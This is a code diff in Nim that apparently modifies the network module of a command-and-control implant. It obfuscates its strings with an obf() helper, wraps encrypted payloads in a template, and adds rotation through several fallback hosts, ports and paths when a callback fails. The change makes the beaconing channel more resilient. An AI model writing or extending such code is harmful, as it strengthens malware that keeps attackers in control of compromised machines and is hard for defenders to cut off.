@@ -279,11 +279,12 @@ proc buildWirePayload(plain: string): string =
   return tpl.replace(contentMarker, encrypted)
 
 proc baseUrl(): string =
-  # Builds the base url from host, port, path, and channel
-  let p = parsePortDigits(port)
-  if p == 0: return ""
+  let sep = obf(",")
+  let h = host.split(sep)[0]
+  let pt = port.split(sep)[0]
+  if parsePortDigits(pt) == 0: return ""
   let scheme = if channel == obf("https"): obf("https://") else: obf("http://")
-  scheme & host & obf(":") & port & path
+  scheme & h & obf(":") & pt & path.split(sep)[0]
 
 proc exchangeUrl(url: string; isPost: bool; payload: string): HttpResponse =
   # Sends a get or post to the given url and decrypts the response
@@ -323,8 +324,17 @@ proc exchangeUrl(url: string; isPost: bool; payload: string): HttpResponse =
     return HttpResponse(ok: true, code: r.code, body: responseBody)
 
 proc exchange(isPost: bool; payload: string): HttpResponse =
-  # Runs the exchange against the base url
-  exchangeUrl(baseUrl(), isPost, payload)
+  result = exchangeUrl(baseUrl(), isPost, payload)
+  if result.ok:
+    return
+  let sep = obf(",")
+  let hs = host.split(sep)
+  let ps = port.split(sep)
+  let xs = path.split(sep)
+  if hs.len > 1 and hs.len == ps.len and hs.len == xs.len:
+    host = join(hs[1 ..^ 1], sep) & sep & hs[0]
+    port = join(ps[1 ..^ 1], sep) & sep & ps[0]
+    path = join(xs[1 ..^ 1], sep) & sep & xs[0]
 
 proc httpGet*(): HttpResponse =
   # Sends an empty get request
